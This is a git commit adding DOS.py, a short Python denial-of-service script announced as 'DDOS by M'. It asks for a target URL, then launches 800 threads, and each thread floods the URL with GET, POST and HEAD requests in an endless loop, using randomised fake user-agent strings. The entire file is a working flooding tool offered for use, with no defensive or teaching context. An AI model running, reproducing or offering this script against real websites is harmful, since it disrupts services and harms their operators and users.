ed8d7bc0e5eba56a63809f1a0adfc1ca154db4a5
The M <76592330+profprops@users.noreply.github.com>
2020-12-25 18:24:43 +0300

    Create DOS.py

---
+++ DOS.py
@@ -0,0 +1,26 @@
+from threading import Thread
+from time import sleep
+import random
+import requests
+import fake_useragent as agent
+us = agent.UserAgent()
+ag = us.random
+headers = {
+	"User-Agent" : str(ag)
+}
+print("DDOS by M")
+sleep(2)
+print("Loading...")
+sleep(2)
+URL = input("URL: ")
+def sendpackage():
+	while True:
+		requests.get(URL, headers=headers)
+		requests.post(URL, headers=headers)
+		requests.head(URL, headers=headers)
+		print("Sended + 1 package")
+		
+if __name__ == '__main__':
+	for i in range(800):
+		thr = Thread(target=sendpackage)
+		thr.start()
